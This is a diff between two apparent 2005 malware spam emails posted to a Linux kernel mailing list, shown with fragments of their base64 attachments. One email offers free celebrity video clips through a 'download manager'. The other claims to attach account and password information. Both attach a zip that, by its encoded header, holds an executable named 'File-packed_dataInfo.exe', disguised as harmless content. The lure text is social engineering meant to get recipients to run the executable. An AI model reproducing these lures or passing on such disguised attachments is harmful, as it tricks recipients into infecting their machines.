@@ -1,30 +1,29 @@
-From: office@twilight.vtc.vsc.edu.sgi.com
-Subject: Paris Hilton & Nicole Richie
-Date: Tue, 20 Dec 2005 00:54:40 UTC
-Message-ID: <b40ca10620f6e7bb9@twilight.vtc.vsc.edu>
+From: webmaster@dynamicdancers.co.uk
+Subject: Registration Confirmation
+Date: Tue, 20 Dec 2005 00:41:19 GMT
+Message-ID: <20cd.d271fa23cf0cb3d@dynamicdancers.co.uk>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=849257610dd85.a65"
+Content-Type: multipart/mixed; boundary="===e931a3ad7e3776efe"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: XPost@oss.sgi.com
+To: listening@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=849257610dd85.a65
+--===e931a3ad7e3776efe
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---=849257610dd85.a65
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.dynamicdancers.co.uk
+***** Email: postman@dynamicdancers.co.uk
+--===e931a3ad7e3776efe
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=849257610dd85.a65--
+--===e931a3ad7e3776efe--
